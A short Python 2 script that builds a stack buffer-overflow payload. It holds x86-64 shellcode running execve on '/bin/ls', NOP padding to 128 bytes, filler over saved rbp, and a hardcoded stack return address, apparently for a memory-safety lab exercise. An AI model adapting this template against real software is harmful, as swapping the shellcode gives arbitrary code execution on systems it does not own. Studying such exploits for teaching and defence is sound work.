# Based on http://shell-storm.org/shellcode/files/shellcode-77.php

# No-op code, see https://en.wikipedia.org/wiki/NOP_(code)
NOP = "\x90"

exploit = "\x48\x31\xd2\x48\xbb\xff\x2f\x62"\
          "\x69\x6e\x2f\x6c\x73\x48\xc1\xeb"\
          "\x08\x53\x48\x89\xe7\x48\x31\xc0"\
          "\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
exploit += NOP * (128 - len(exploit))
exploit += NOP * 8 # additional data
exploit += NOP * 8 # additional data
exploit += NOP * 8 # rbp
exploit += "\x80\x70\xff\xff\xff\x7f\x00\x00" # Return address
print exploit
